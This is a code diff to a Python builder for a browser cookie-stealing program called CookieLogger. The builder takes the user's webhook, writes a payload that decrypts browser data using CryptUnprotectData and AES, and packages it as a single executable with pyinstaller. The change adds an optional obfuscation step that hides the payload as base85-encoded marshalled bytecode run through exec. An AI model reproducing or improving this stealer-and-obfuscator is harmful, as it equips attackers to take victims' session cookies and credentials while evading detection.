@@ -1,15 +1,17 @@
 import os
 import base64
 import shutil
+import marshal
 
-os.system("python -m pip install pyinstaller pypiwin32 pycryptodome")
+os.system("python -m pip install pyinstaller pypiwin32 pycryptodome requests")
 os.system("cls")
 
 webhook = input("Paste your Webhook: ")
+obfuscate = input("Obfuscate (Encrypt) the code? (Y/N): ")
 
 id = base64.b64encode(os.urandom(16)).decode().replace("=","").replace("/","")
 
-open(f"tmp_{id}.py", "w").write(f"""
+code = f"""
 webhook = "{webhook}" # WEBHOOK HERE
 
 import os
@@ -172,7 +174,16 @@ class CookieLogger:
 
 if __name__ == "__main__":
     CookieLogger()
-""")
+"""
+
+if obfuscate.lower().startswith("Y"):
+    newcode = f"""
+    import os;import json;import base64;import shutil;import sqlite3;import io;import requests;import traceback;import subprocess;import marshal;from win32crypt import CryptUnprotectData;from Crypto.Cipher import AES;exec(marshal.loads(base64.b85decode(b"{base64.b85encode(marshal.dumps(compile(code, id, "exec"))).decode()}")))
+    """
+else:
+    newcode = code
+
+open(f"tmp_{id}.py", "w").write(newcode)
 
 os.system(f"pyinstaller --clean --onefile tmp_{id}.py")
 
